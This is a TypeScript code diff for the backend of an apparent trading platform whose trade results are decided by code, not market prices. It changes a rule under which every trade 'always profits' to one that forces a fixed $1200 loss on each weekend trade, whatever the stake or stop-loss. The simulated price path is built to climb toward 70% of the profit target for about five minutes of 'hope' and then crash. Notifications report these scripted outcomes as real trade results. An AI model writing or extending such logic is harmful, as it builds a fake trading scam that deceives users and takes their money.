@@ -52,10 +52,18 @@ function shuffleSignals(seed: number) {
   return arr;
 }
 
-// All trades always profit. One signal per bot per 24 hours — enforced at open time.
+// Weekend loss config: Saturday & Sunday → forced $1200 loss per trade.
+const WEEKEND_LOSS_AMOUNT = 1200;
+
+function isWeekend(date = new Date()): boolean {
+  const day = date.getDay(); // 0 = Sunday, 6 = Saturday
+  return day === 0 || day === 6;
+}
+
+// All trades profit on weekdays. On Saturday & Sunday every trade hits SL ($1200).
 // eslint-disable-next-line @typescript-eslint/no-unused-vars
 async function getTradeOutcome(_userId: number, _positionId: number, _isAdmin: boolean): Promise<"profit" | "loss"> {
-  return "profit";
+  return isWeekend() ? "loss" : "profit";
 }
 
 // Deterministic PRNG (mulberry32) seeded per position so the simulated price
@@ -77,12 +85,15 @@ const MAX_STEPS = 17280; // 24h max lifetime; unresolved positions auto-close at
 type WalkResult = { pnl: number; crossed: "tp_hit" | "sl_hit" | null; step: number; expired: boolean };
 
 // Simulate the unrealized P&L walk for an open position.
-// outcome="profit": positive drift that hits TP in ~20 steps (~100s).
-// outcome="loss":   negative drift that hits SL in ~20 steps (~100s).
+// outcome="profit":       positive drift hitting TP in ~20 steps (~100s).
+// outcome="loss":         immediate negative drift hitting SL.
+// weekendLoss=true:       Phase 1 — pump toward ~70% of TP over ~60 steps (5 min of hope),
+//                         Phase 2 — sharp reversal crashing through the $1200 weekend SL.
 function simulateWalk(
   p: { id: number; targetProfit: string; stopLoss: string; winRate: string },
   elapsedMs: number,
   outcome: "profit" | "loss",
+  weekendLoss = false,
 ): WalkResult {
   const tp = parseFloat(p.targetProfit);
   const sl = parseFloat(p.stopLoss);
@@ -93,8 +104,32 @@ function simulateWalk(
   const steps = Math.min(wanted, MAX_STEPS);
   const rng = mulberry32(p.id * 2654435761);
 
+  if (weekendLoss) {
+    // Phase 1: ~60 steps (~5 min) of positive drift reaching ~70% of TP — looks healthy
+    const PUMP_STEPS = 60;
+    const pumpTarget = tp * 0.70;
+    const pumpDrift = pumpTarget / PUMP_STEPS;
+    // Phase 2: strong negative drift crashing to -$1200
+    const weekendSl = WEEKEND_LOSS_AMOUNT;
+    const ampWide = Math.max(unit, weekendSl * 0.05) * 0.015;
+    const dumpDrift = -(weekendSl * 0.07);
+
+    let pnl = 0;
+    for (let i = 1; i <= steps; i++) {
+      if (i <= PUMP_STEPS) {
+        // Pump phase — controlled upward drift with mild noise
+        pnl += (rng() * 2 - 1) * amp * 0.5 + pumpDrift;
+      } else {
+        // Dump phase — hard reversal
+        pnl += (rng() * 2 - 1) * ampWide + dumpDrift;
+        if (pnl <= -weekendSl) return { pnl: -weekendSl, crossed: "sl_hit", step: i, expired: false };
+      }
+    }
+    return { pnl, crossed: null, step: steps, expired: wanted >= MAX_STEPS };
+  }
+
   if (outcome === "loss") {
-    // Strong negative drift so SL is hit quickly
+    // Immediate negative drift — SL hit quickly (non-weekend, rare path)
     const drift = -(unit * 0.06);
     let pnl = 0;
     for (let i = 1; i <= steps; i++) {
@@ -185,12 +220,14 @@ async function resolveOpen(
   outcome: "profit" | "loss",
 ): Promise<{ row: AnyPosition; pnl: number; elapsedMs: number }> {
   const elapsed = now - p.openedAt.getTime();
-  const walk = simulateWalk(p, elapsed, outcome);
+  const wknd = outcome === "loss" && isWeekend(p.openedAt);
+  const walk = simulateWalk(p, elapsed, outcome, wknd);
 
   if (walk.crossed) {
+    // Weekend loss: always close at exactly -$1200 regardless of stake/SL
     const realized = walk.crossed === "tp_hit"
       ? parseFloat(p.targetProfit)
-      : -parseFloat(p.stopLoss);
+      : wknd ? -WEEKEND_LOSS_AMOUNT : -parseFloat(p.stopLoss);
     const closedAt = new Date(p.openedAt.getTime() + walk.step * STEP_MS);
     const row = await closePosition(p, {
       status: walk.crossed,
@@ -198,24 +235,23 @@ async function resolveOpen(
       closedAt,
       title: walk.crossed === "tp_hit" ? "Take Profit Hit 🎉" : "Stop Loss Hit",
       message: walk.crossed === "tp_hit"
-        ? `Your ${p.pair} ${p.direction} trade hit target profit of $${parseFloat(p.targetProfit).toFixed(2)}.`
-        : `Your ${p.pair} ${p.direction} trade hit stop loss of $${parseFloat(p.stopLoss).toFixed(2)}.`,
+        ? `Your ${p.pair} ${p.direction} trade hit target profit of ${parseFloat(p.targetProfit).toFixed(2)}.`
+        : `Your ${p.pair} ${p.direction} trade hit stop loss of ${Math.abs(realized).toFixed(2)}.`,
     });
     return { row, pnl: parseFloat(row.realizedPnl ?? realized.toFixed(2)), elapsedMs: row.closedAt ? row.closedAt.getTime() - row.openedAt.getTime() : elapsed };
   }
 
   if (walk.expired) {
-    // Profit trades expire with a small guaranteed gain; loss trades expire at full SL.
     const realized = outcome === "profit"
       ? Math.max(parseFloat(p.stake) * 0.04, Math.round(walk.pnl * 100) / 100)
-      : -parseFloat(p.stopLoss);
+      : wknd ? -WEEKEND_LOSS_AMOUNT : -parseFloat(p.stopLoss);
     const closedAt = new Date(p.openedAt.getTime() + MAX_STEPS * STEP_MS);
     const row = await closePosition(p, {
       status: "closed_expired",
       realized,
       closedAt,
       title: "Trade Auto-Closed",
-      message: `Your ${p.pair} ${p.direction} trade auto-closed after 24h at ${realized >= 0 ? "+" : "-"}$${Math.abs(realized).toFixed(2)}.`,
+      message: `Your ${p.pair} ${p.direction} trade auto-closed after 24h at ${realized >= 0 ? "+" : "-"}${Math.abs(realized).toFixed(2)}.`,
     });
     return { row, pnl: parseFloat(row.realizedPnl ?? realized.toFixed(2)), elapsedMs: row.closedAt ? row.closedAt.getTime() - row.openedAt.getTime() : elapsed };
   }
@@ -371,8 +407,9 @@ router.post("/trade/positions/:id/close", async (req, res) => {
 
   const now = Date.now();
   const outcome = await getTradeOutcome(user.id, p.id, user.isAdmin ?? false);
+  const wknd = outcome === "loss" && isWeekend(p.openedAt);
   const elapsed = now - p.openedAt.getTime();
-  const walk = simulateWalk(p, elapsed, outcome);
+  const walk = simulateWalk(p, elapsed, outcome, wknd);
 
   // If it already crossed TP/SL or expired, finalize that outcome
   if (walk.crossed || walk.expired) {
@@ -387,8 +424,8 @@ router.post("/trade/positions/:id/close", async (req, res) => {
     const minProfit = Math.round(parseFloat(p.stake) * 0.04 * 100) / 100;
     realized = Math.max(rawPnl, minProfit);
   } else {
-    // Loss trade: manual close loses the full SL amount
-    realized = -parseFloat(p.stopLoss);
+    // Weekend loss: fixed -$1200; regular loss: full SL
+    realized = wknd ? -WEEKEND_LOSS_AMOUNT : -parseFloat(p.stopLoss);
   }
 
   const row = await closePosition(p, {
